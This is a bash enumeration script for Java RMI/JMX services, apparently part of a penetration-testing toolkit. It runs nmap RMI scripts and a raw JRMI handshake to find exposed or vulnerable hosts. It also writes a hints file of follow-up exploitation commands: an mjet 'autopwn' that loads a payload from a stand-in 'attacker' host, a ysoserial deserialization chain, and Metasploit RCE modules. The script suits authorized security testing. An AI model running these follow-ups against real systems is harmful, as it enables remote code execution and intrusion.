#!/usr/bin/env bash
# enum-jmx.sh — Java RMI / JMX enumeration.
#
# JMX is the perennial Java-deserialization RCE surface. Unauth or default-
# creds JMX with a writeable MBean server is direct RCE via mjet / ysoserial.
#
# READ-ONLY: nmap rmi-* NSE + raw RMI registry list.
# Never invokes mjet / ysoserial — operator runs those manually after triage.

set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"
parse_common_args "$@" || exit 1
log "jmx/rmi: $(wc -l < "$TARGETS") targets -> $OUT"

IPS=$(ips_only "$TARGETS")

if have nmap; then
    log "nmap rmi-dumpregistry + rmi-vuln-classloader"
    # Use --script on per-port so we don't probe ports that don't actually answer
    nmap -Pn $(nmap_bound_args) -p1099,9999,9010,11099,7199 \
         --script 'rmi-dumpregistry,rmi-vuln-classloader' \
         -iL <(echo "$IPS") -oA "$OUT/nmap-jmx" >/dev/null 2>&1 || true

    # rmi-vuln-classloader = CVE-2011-3556 + family — surface as CRITICAL
    if [ -f "$OUT/nmap-jmx.nmap" ] && grep -q 'VULNERABLE' "$OUT/nmap-jmx.nmap"; then
        grep -B2 -A2 'VULNERABLE' "$OUT/nmap-jmx.nmap" > "$OUT/_jmx_vuln.txt" || true
        err "CRITICAL: RMI classloader vulnerability detected — see _jmx_vuln.txt"
    fi
fi

# Try direct registry dump — works against most stock JMX setups
# RMI registry uses serialized java.rmi.registry.RegistryImpl. We don't decode
# it; we just confirm the port speaks RMI by checking for the magic bytes
# 0x4a 0x52 0x4d 0x49 ("JRMI") in the response.
if have nc; then
    while read -r target; do
        [ -z "$target" ] && continue
        read -r ip port <<< "$(split_ipport "$target")"
        mkdir -p "$OUT/$ip"
        # Magic + version 2 + protocol single-op
        printf '\x4a\x52\x4d\x49\x00\x02\x4b' | \
            timeout 5 nc -nv -w 3 "$ip" "$port" 2>/dev/null | \
            xxd > "$OUT/$ip/rmi_handshake_${port}.txt" || true
        if grep -q 'JRMI\|4a52 4d49' "$OUT/$ip/rmi_handshake_${port}.txt" 2>/dev/null; then
            hit "RMI registry: $ip:$port speaks JRMI"
        fi
    done < "$TARGETS"
fi

cat > "$OUT/_hints.txt" <<'EOF'
JMX / Java RMI follow-ups (operator-driven):

Identify reachable MBeans:
  mjet -t <ip>:<port> info

If MBean server exposes javax.management.loading.MLet:
  mjet -t <ip>:<port> autopwn http://attacker/payload.jar

Tomcat / WebLogic / JBoss specific MBean RCE chains:
  ysoserial.jar CommonsCollections1 'cmd' | <serial-injection-tool>

Useful Metasploit modules (NOT auto-run):
  exploit/multi/misc/java_rmi_server
  exploit/multi/misc/java_jmx_server
EOF

log "jmx/rmi dispatcher done."
